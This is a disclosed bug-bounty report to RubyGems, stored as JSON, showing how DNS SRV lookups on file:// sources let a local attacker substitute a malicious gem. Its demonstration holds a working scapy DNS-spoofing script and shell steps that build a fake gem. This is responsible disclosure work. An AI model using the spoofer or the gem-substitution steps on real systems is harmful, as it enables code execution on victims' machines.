{"id":411519,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTE1MTk=","url":"https://hackerone.com/reports/411519","title":"DNS SRV lookup of file:// sources enables local hijacking of gems","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-09-19T18:10:29.578Z","submitted_at":"2018-09-19T18:10:29.578Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"plover","url":"/plover","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby communityâ€™s gem hosting service."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-12-11T16:34:46.231Z","bug_reporter_agreed_on_going_public_at":"2018-11-11T16:34:45.098Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Summary\n\n`gem` makes a DNS SRV query for each of its configured sources; the response is allowed to override the source URL in certain ways. The SRV query happens not only for http:// and https:// sources, but also for s3:// and file://. In the case of file://, the SRV response may add a prefix to the local filesystem path from which gems are fetched. As a consequence, an attacker who can provide or spoof DNS responses, and can write to the local filesystem, may cause a victim to download fake gems with arbitrary contents.\n\n# Demonstration\n\nHere is how an attacker may hijack a victim's installation of the `minitest` gem. The users `attacker` and `victim` share the same local filesystem. `victim` expects to install gems from /home/victim/trusted-gem-path, but `attacker` will force the installation to be from /tmp/attack/home/victim/trusted-gem-path instead.\n\nFirst, `victim` sets up a file:// repo. This could also be done by some other party, like a local administrator.\n\n```\nvictim$ mkdir -p /home/victim/trusted-gem-path/gems\nvictim$ (cd /home/victim/trusted-gem-path/gems \u0026\u0026 gem fetch --clear-sources --source https://rubygems.org/ minitest)\nvictim$ gem generate_index -d /home/victim/trusted-gem-path\n```\n\nThen `attacker` makes a malicious gem file and installs it under a prefix where `attacker` can write and `victim` can read. We'll use /tmp/attack.\n\n```\n# Make a malicious gem\nattacker$ mkdir lib\nattacker$ echo 'puts \"hacked\"' \u003e lib/hacked.rb\nattacker$ cat \u003c\u003cEOF \u003e hacked.gemspec\nGem::Specification.new do |s|\n  s.name = 'minitest'\n  s.version = '5.11.3'\n  s.files = ['lib/hacked.rb']\nend\nEOF\nattacker$ gem build --force hacked.gemspec \n# Make it available under /tmp/attack\nattacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems\nattacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems\nattacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path\n```\n\nNext, `attacker` runs a program to spoof SRV responses. This will require root privileges if run on the same host, but it could also be done from another host in the same local network. The attacker may even control the local DNS, for example by being the wi-fi admin.\n\n```\n#!/usr/bin/env python3\n\nfrom scapy.all import *\n\nTARGET = b\"xxx./tmp/attack\"\n\ndef respond(pkt):\n    if not (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):\n        return\n    q = pkt[DNSQR]\n    # Nothing after \"_rubygems._tcp.\" indicates that the host is empty;\n    # i.e., that it's likely a lookup for a file:// URL. 33 == SRV.\n    if not (q.qname == b\"_rubygems._tcp.\" and q.qtype == 33):\n        return\n    resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) \\\n        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \\\n        / DNS(qr=1, id=pkt[DNS].id, qd=q, ancount=1) \\\n        / DNSRRSRV(type=33, rrname=q.qname, ttl=30, priority=0, weight=1, port=80, rdlen=8+len(TARGET), target=TARGET)\n    send(resp)\n\nsniff(filter=\"udp dst port 53\", prn=respond)\n```\n\nFinally, `victim` tries to fetch a gem and specifically asks for their previously configured file:// source. `attacker`'s SRV response adds a /tmp/attack prefix and `victim` ends up with a malicious gem.\n\n```\nvictim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest\nvictim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -\nlib/hacked.rb\n```\n\n# Analysis\n\nThe [`api_endpoint`](https://github.com/rubygems/rubygems/blob/27041c454411ae2b9372e4619b1e265096284930/lib/rubygems/remote_fetcher.rb#L97-L119) function takes a URL, extracts the host component, and then issues a SRV query for `_rubygems._tcp.#{host}`. Its usual purpose is to replace \"rubygems.org\" with \"api.rubygems.org\" in http:// and https:// URLs; but it is also called for s3:// and file:// URLs. In a typical file:// URL, the host component is empty, so the query will be for `_rubygems._tcp.`.\n\n`api_endpoint` has the property that [it allows limited control of parts of the URL other than the host component](https://github.com/rubygems/rubygems/pull/2035): in particular you can add a prefix to the path component by including `/` characters in the SRV response. The attack works by sending a SRV response of `xxx./tmp/attack`. The `xxx.` can be anything, as long as it ends with a `.` in order to pass the subdomain check. Receiving such a response, `api_endpoint` transforms the input URL\n```\nfile:///home/victim/trusted-gem-path\n```\ninto the output URL\n```\nfile://xxx./tmp/attack/home/victim/trusted-gem-path\n```\nIn the output URL, the `xxx.` is technically the host component, but it doesn't matter because it [is ignored](https://github.com/rubygems/rubygems/blob/27041c454411ae2b9372e4619b1e265096284930/lib/rubygems/remote_fetcher.rb#L237-L242).\n\nThe conditions for exploitation seem fairly narrow:\n- The victim and attacker must share a filesystem.\n- The attacker must know the path to the victim's file:// repo.\n- The attacker must anticipate the name of a gem that the victim will install.\n- The attacker must be able to provide DNS responses.\n\nI don't know how common such conditions are. While `gem` supports file:// sources, I wasn't able to find much information on configuring them other than [one bug report](https://github.com/rubygems/rubygems/issues/761). It seems it's more common to do a [shared repository over http](https://guides.rubygems.org/run-your-own-gem-server/) than using a shared filesystem. Commit [37d486cfd9](https://github.com/rubygems/rubygems/commit/37d486cfd97fc0f4d17f2de0799269535f330721) says \"bundler gemspecs use file:// URIs for their sources,\" but I could not find in Bundler where that happens.\n\n# Remediation\n\nThe best solution seems to be not to call `api_endpoint` for file:// (and s3://) URLs. The host component of such URLs doesn't have the same meaning as it does in http:// and https:// URLs.\n\nA mitigation that in this case would be sufficient would be to apply stricter validation of SRV responses, not allowing them to modify any components other than the host ([GitHub \\#2035](https://github.com/rubygems/rubygems/pull/2035), [HackerOne \\#274267](https://hackerone.com/reports/274267)).\n\n## Impact\n\nThe CVSS calculator says the severity is \"high\" but I would put it at \"low\" because of the difficulty of execution. The impact is indeed bad: arbitrary code execution using the victim's privileges, whether through Ruby code or a C extension. But as far as I can tell, the conditions for exploitation are uncommon.","vulnerability_information_html":"\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003cp\u003e\u003ccode\u003egem\u003c/code\u003e makes a DNS SRV query for each of its configured sources; the response is allowed to override the source URL in certain ways. The SRV query happens not only for http:// and https:// sources, but also for s3:// and file://. In the case of file://, the SRV response may add a prefix to the local filesystem path from which gems are fetched. As a consequence, an attacker who can provide or spoof DNS responses, and can write to the local filesystem, may cause a victim to download fake gems with arbitrary contents.\u003c/p\u003e\n\n\u003ch1 id=\"demonstration\"\u003eDemonstration\u003c/h1\u003e\n\n\u003cp\u003eHere is how an attacker may hijack a victim\u0026#39;s installation of the \u003ccode\u003eminitest\u003c/code\u003e gem. The users \u003ccode\u003eattacker\u003c/code\u003e and \u003ccode\u003evictim\u003c/code\u003e share the same local filesystem. \u003ccode\u003evictim\u003c/code\u003e expects to install gems from /home/victim/trusted-gem-path, but \u003ccode\u003eattacker\u003c/code\u003e will force the installation to be from /tmp/attack/home/victim/trusted-gem-path instead.\u003c/p\u003e\n\n\u003cp\u003eFirst, \u003ccode\u003evictim\u003c/code\u003e sets up a file:// repo. This could also be done by some other party, like a local administrator.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evictim$ mkdir -p /home/victim/trusted-gem-path/gems\nvictim$ (cd /home/victim/trusted-gem-path/gems \u0026amp;\u0026amp; gem fetch --clear-sources --source https://rubygems.org/ minitest)\nvictim$ gem generate_index -d /home/victim/trusted-gem-path\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen \u003ccode\u003eattacker\u003c/code\u003e makes a malicious gem file and installs it under a prefix where \u003ccode\u003eattacker\u003c/code\u003e can write and \u003ccode\u003evictim\u003c/code\u003e can read. We\u0026#39;ll use /tmp/attack.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Make a malicious gem\nattacker$ mkdir lib\nattacker$ echo \u0026#39;puts \u0026quot;hacked\u0026quot;\u0026#39; \u0026gt; lib/hacked.rb\nattacker$ cat \u0026lt;\u0026lt;EOF \u0026gt; hacked.gemspec\nGem::Specification.new do |s|\n  s.name = \u0026#39;minitest\u0026#39;\n  s.version = \u0026#39;5.11.3\u0026#39;\n  s.files = [\u0026#39;lib/hacked.rb\u0026#39;]\nend\nEOF\nattacker$ gem build --force hacked.gemspec \n# Make it available under /tmp/attack\nattacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems\nattacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems\nattacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNext, \u003ccode\u003eattacker\u003c/code\u003e runs a program to spoof SRV responses. This will require root privileges if run on the same host, but it could also be done from another host in the same local network. The attacker may even control the local DNS, for example by being the wi-fi admin.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/env python3\n\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003escapy.all\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eTARGET\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xxx./tmp/attack\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003erespond\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eDNS\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003epkt\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eDNS\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eopcode\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eDNS\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eancount\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eq\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eDNSQR\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# Nothing after \u0026quot;_rubygems._tcp.\u0026quot; indicates that the host is empty;\n\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# i.e., that it\u0026#39;s likely a lookup for a file:// URL. 33 == SRV.\n\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eqname\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;_rubygems._tcp.\u0026quot;\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eqtype\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e33\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003eUDP\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eUDP\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edport\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eUDP\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esport\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003eDNS\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eqr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epkt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eDNS\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eqd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eancount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003eDNSRRSRV\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e33\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003errname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eqname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ettl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e30\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epriority\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eweight\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erdlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003esniff\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003efilter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;udp dst port 53\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eprn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003erespond\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFinally, \u003ccode\u003evictim\u003c/code\u003e tries to fetch a gem and specifically asks for their previously configured file:// source. \u003ccode\u003eattacker\u003c/code\u003e\u0026#39;s SRV response adds a /tmp/attack prefix and \u003ccode\u003evictim\u003c/code\u003e ends up with a malicious gem.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evictim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest\nvictim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -\nlib/hacked.rb\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fblob%2F27041c454411ae2b9372e4619b1e265096284930%2Flib%2Frubygems%2Fremote_fetcher.rb%23L97-L119\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003eapi_endpoint\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e function takes a URL, extracts the host component, and then issues a SRV query for \u003ccode\u003e_rubygems._tcp.#{host}\u003c/code\u003e. Its usual purpose is to replace \u0026quot;rubygems.org\u0026quot; with \u0026quot;api.rubygems.org\u0026quot; in http:// and https:// URLs; but it is also called for s3:// and file:// URLs. In a typical file:// URL, the host component is empty, so the query will be for \u003ccode\u003e_rubygems._tcp.\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eapi_endpoint\u003c/code\u003e has the property that \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fpull%2F2035\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eit allows limited control of parts of the URL other than the host component\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e: in particular you can add a prefix to the path component by including \u003ccode\u003e/\u003c/code\u003e characters in the SRV response. The attack works by sending a SRV response of \u003ccode\u003exxx./tmp/attack\u003c/code\u003e. The \u003ccode\u003exxx.\u003c/code\u003e can be anything, as long as it ends with a \u003ccode\u003e.\u003c/code\u003e in order to pass the subdomain check. Receiving such a response, \u003ccode\u003eapi_endpoint\u003c/code\u003e transforms the input URL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efile:///home/victim/trusted-gem-path\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003einto the output URL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efile://xxx./tmp/attack/home/victim/trusted-gem-path\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the output URL, the \u003ccode\u003exxx.\u003c/code\u003e is technically the host component, but it doesn\u0026#39;t matter because it \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fblob%2F27041c454411ae2b9372e4619b1e265096284930%2Flib%2Frubygems%2Fremote_fetcher.rb%23L237-L242\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eis ignored\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe conditions for exploitation seem fairly narrow:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe victim and attacker must share a filesystem.\u003c/li\u003e\n\u003cli\u003eThe attacker must know the path to the victim\u0026#39;s file:// repo.\u003c/li\u003e\n\u003cli\u003eThe attacker must anticipate the name of a gem that the victim will install.\u003c/li\u003e\n\u003cli\u003eThe attacker must be able to provide DNS responses.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI don\u0026#39;t know how common such conditions are. While \u003ccode\u003egem\u003c/code\u003e supports file:// sources, I wasn\u0026#39;t able to find much information on configuring them other than \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fissues%2F761\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eone bug report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It seems it\u0026#39;s more common to do a \u003ca href=\"/redirect?url=https%3A%2F%2Fguides.rubygems.org%2Frun-your-own-gem-server%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eshared repository over http\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e than using a shared filesystem. Commit \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fcommit%2F37d486cfd97fc0f4d17f2de0799269535f330721\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e37d486cfd9\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e says \u0026quot;bundler gemspecs use file:// URIs for their sources,\u0026quot; but I could not find in Bundler where that happens.\u003c/p\u003e\n\n\u003ch1 id=\"remediation\"\u003eRemediation\u003c/h1\u003e\n\n\u003cp\u003eThe best solution seems to be not to call \u003ccode\u003eapi_endpoint\u003c/code\u003e for file:// (and s3://) URLs. The host component of such URLs doesn\u0026#39;t have the same meaning as it does in http:// and https:// URLs.\u003c/p\u003e\n\n\u003cp\u003eA mitigation that in this case would be sufficient would be to apply stricter validation of SRV responses, not allowing them to modify any components other than the host (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fpull%2F2035\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGitHub #2035\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, \u003ca href=\"https://hackerone.com/reports/274267\"\u003eHackerOne #274267\u003c/a\u003e).\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe CVSS calculator says the severity is \u0026quot;high\u0026quot; but I would put it at \u0026quot;low\u0026quot; because of the difficulty of execution. The impact is indeed bad: arbitrary code execution using the victim\u0026#39;s privileges, whether through Ruby code or a C extension. But as far as I can tell, the conditions for exploitation are uncommon.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-12-11T16:34:45.154Z","allow_singular_disclosure_after":-64675121.40700914,"singular_disclosure_allowed":true,"vote_count":22,"voters":["sameerphad72","s_p_q_r","dhakal_ananda","mygf","akaash_pantherdefence","mehulpanchal007","geeknik","an0nym0us","kunal94","khizer47","and 12 more..."],"severity":{"rating":"high","score":7.2,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":2043,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rubygems/rubygems","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3359451,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","markdown_message":"\u003cp\u003eThanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty 